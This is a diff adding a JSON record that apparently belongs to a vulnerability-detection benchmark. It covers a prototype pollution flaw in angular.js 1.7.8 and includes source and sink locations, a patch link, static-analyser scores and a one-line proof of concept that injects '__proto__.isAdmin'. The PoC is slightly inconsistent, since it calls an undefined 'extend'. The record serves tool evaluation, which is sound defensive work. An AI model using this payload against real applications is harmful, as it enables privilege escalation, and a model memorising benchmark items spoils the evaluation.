@@ -1,0 +1,66 @@
+{
+    "advisory": {
+        "id": 1343,
+        "cwe": "CWE-471"
+    },
+    "correct_cwe": " CWE-471",
+    "correct_package_link": "https://github.com/angular/angular.js/archive/v1.7.8.tar.gz",
+    "vulnerability": {
+        "vulnerability_location": [
+            {
+                "source": {
+                    "file": "src/Angular.js",
+                    "lineno": 324,
+                    "code": "function baseExtend(dst, objs, deep) {"
+                },
+                "sink": {
+                    "file": "src/Angular.js",
+                    "lineno": 346,
+                    "code": "baseExtend(dst[key], [src], true);"
+                }
+            }
+        ]
+    },
+    "poc": [
+        {
+            "code": "let baseExtend = require('angular'); extend(true, {}, JSON.parse('{\"__proto__\": {\"isAdmin\": true}}')); console.log({}.isAdmin); // true"
+        }
+    ],
+    "patch": [
+        {
+            "url": "https://github.com/angular/angular.js/pull/16913/files"
+        }
+    ],
+    "tools": {
+        "codeql": {
+            "score": "A"
+        },
+        "njsscan": {
+            "score": "D"
+        },
+        "graudit": {
+            "score": "C"
+        },
+        "insidersec": {
+            "score": "D"
+        },
+        "eslint": {
+            "score": "C"
+        },
+        "appinspector": {
+            "score": "C"
+        },
+        "msdevskim": {
+            "score": "C"
+        },
+        "drek": {
+            "score": "C"
+        },
+        "mosca": {
+            "score": "C"
+        },
+        "odgen": {
+            "score": "D"
+        }
+    }
+}
